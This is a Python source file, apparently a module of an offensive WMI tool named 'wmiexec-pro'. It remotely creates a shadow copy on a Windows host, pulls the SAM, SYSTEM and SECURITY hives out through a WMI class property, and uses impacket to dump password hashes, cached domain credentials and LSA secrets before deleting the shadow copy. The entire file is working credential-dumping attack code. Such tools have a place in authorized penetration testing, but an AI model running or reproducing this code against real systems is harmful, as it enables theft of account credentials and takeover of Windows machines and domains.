import logging
import uuid
import base64
import time
import os

from lib.helpers import get_vbs
from lib.methods.executeVBS import executeVBS_Toolkit
from lib.methods.classMethodEx import class_MethodEx

from binascii import hexlify
from impacket.examples.secretsdump import LocalOperations, SAMHashes, LSASecrets


class Hashdump():
    def __init__(self, iWbemLevel1Login):
        self.iWbemLevel1Login = iWbemLevel1Login
        self.executer = executeVBS_Toolkit(self.iWbemLevel1Login)
        self.hostname = self.iWbemLevel1Login._INTERFACE__target
        self.save_Path = os.path.join("save", self.hostname)
        self.timeout = 10
        self.logger = logging.getLogger("wmiexec-pro")
        self.logger_countdown = logging.getLogger("CountdownLogger")
        # Remaining time for shadow copy action
        self.remaining_Time_SS = 10
        self.ClassName_StoreOutput = "Win32_OSRecoveryConfigurationDataStorage"
        self.ShadowCopy_InstanceID = str(uuid.uuid4())
        self.iWbemServices_cimv2 = None
        self.iWbemServices_subscription = None
        self.hashType = {
            "SSS": ["sam", "system", "security"],
            "NTDS": ["ntds.dit"]
        }["SSS"]

    def hashdump(self):
        if not os.path.exists(self.save_Path):
            os.makedirs(self.save_Path, exist_ok=True)

        self.logger.info("Starting hashdump...")

        # Reuse cimv2/subscription namespace to avoid DCOM limitation
        class_Method = class_MethodEx(self.iWbemLevel1Login)
        self.iWbemServices_cimv2, self.iWbemServices_subscription = class_Method.check_ClassStatus(
            ClassName=self.ClassName_StoreOutput, 
            return_iWbemServices=True
        )

        shadow_id, device_object = self._create_shadow_copy()
        if not shadow_id:
            return False

        # I have been research this for a long time, "ADODB.Stream" can't read "\\?\"" directly
        # But thankfully, after reading the post: https://medium.com/@WaterBucket/understanding-path-resolution-in-windows-70054c446b3b
        # I have try "\??\", then boom!
        kernel_object = device_object.replace("\\\\?\\", "\\??\\")
        if not self._extract_file(kernel_object):
            return False

        if not self._retrieve_file(self.hashType):
            return False

        self._parse_hashes()

        self._cleanup_shadow_copy(shadow_id)


    def _create_shadow_copy(self):
        try:
            win32_shadowcopy, _ = self.iWbemServices_cimv2.GetObject("Win32_ShadowCopy")
            resp = win32_shadowcopy.Create("C:\\", "ClientAccessible")
        except Exception as e:
            self.logger.error(f"Shadow copy creation failed: {e}")
            return None, None
        else:
            if resp.ReturnValue == 0:
                shadow_id = resp.ShadowID
                self.logger.log(100, f"Shadow copy created: {shadow_id}")
                
                # Get device object path
                shadowcopy_instance, _ = self.iWbemServices_cimv2.GetObject(f'Win32_ShadowCopy.ID="{shadow_id}"')
                device_object = shadowcopy_instance.DeviceObject
                self.logger.log(100, f"Device object: {device_object}")
                
                return shadow_id, device_object
            else:
                self.logger.error(f"Failed to create shadow copy, error code: {resp.ReturnValue}")
                return None, None
    
    def _extract_file(self, kernel_object):
        self.logger.info("Dumping secrets from from shadow copy...")

        vbs = get_vbs("RetrieveShadowCopy.vbs")
        vbs = vbs.replace("REPLACE_WITH_CLASSNAME", self.ClassName_StoreOutput)
        vbs = vbs.replace("RELEACE_WITH_UUID", self.ShadowCopy_InstanceID)
        vbs = vbs.replace("RELEACE_WITH_KERNELOBJECT", kernel_object)
        tag = self.executer.ExecuteVBS(vbs_content=vbs, returnTag=True, BlockVerbose=True, iWbemServices=self.iWbemServices_subscription)

        for i in range(self.remaining_Time_SS, 0, -1):
            self.logger_countdown.info(f"Waiting {i}s for file extraction.\r")
            time.sleep(1)

        self.executer.remove_Event(tag, BlockVerbose=True)
        return True

    def _retrieve_file(self, filegroup):
        for filename in filegroup:
            saved = os.path.join(self.save_Path, filename)
            try:
                self.logger.info(f"Downloading {filename}")
                obj, _ = self.iWbemServices_cimv2.GetObject(f'{self.ClassName_StoreOutput}.CreationClassName="{self.ShadowCopy_InstanceID}_{filename}"')
                record = dict(obj.getProperties())
                with open(saved, "wb") as f:
                    f.write(base64.b64decode(record["DebugOptions"]["value"]))
                del obj, record
            except Exception as e:
                self.logger.error(f"Error downloading {filename}: {e}")
                return False
            else:
                if os.path.exists(saved) and os.path.getsize(saved) > 0:
                    size = os.path.getsize(saved)
                    self.logger.log(100, f"Save {filename} to {saved.upper()}, size: {size} bytes")
                else:
                    self.logger.error(f"Failed to download {filename}")
                    return False
        return True

    def _parse_hashes(self):
        self.logger.info("Parsing hashes...")
        try:
            localOperations = LocalOperations(os.path.join(self.save_Path, "system"))
            bootKey = localOperations.getBootKey()
            self.logger.info(f"Boot key extracted successfully, bootkey: 0x{hexlify(bootKey).decode("ascii")}")
            self.logger.info("Extracting password hashes from SAM...")
            # NTDS
            # localOperations.checkNoLMHashPolicy()
            
            # Get SAM hashes
            sam_hashes = SAMHashes(os.path.join(self.save_Path, "sam"), bootKey, isRemote=False, printUserStatus=True, perSecretCallback=lambda secret: self.logger.log(100, secret))
            sam_hashes.dump()

            lsa_secrets = LSASecrets(os.path.join(self.save_Path, "security"), bootKey, isRemote=False, history=True, perSecretCallback=lambda secretType, secret: self.logger.log(100, secret))
            lsa_secrets.dumpCachedHashes()
            lsa_secrets.dumpSecrets()

            # Clean up
            sam_hashes.finish()
            lsa_secrets.finish()
            
        except Exception as e:
            self.logger.error(f"Failed to parse hashes with impacket: {e}")
    
    def _cleanup_shadow_copy(self, shadow_id):
        try:
            self.iWbemServices_cimv2.DeleteInstance(f'Win32_ShadowCopy.ID="{shadow_id}"')
            self.logger.log(100, f"Shadow copy {shadow_id} cleaned up successfully")
        except Exception as e:
            self.logger.error(f"Failed to cleanup shadow copy: {e}")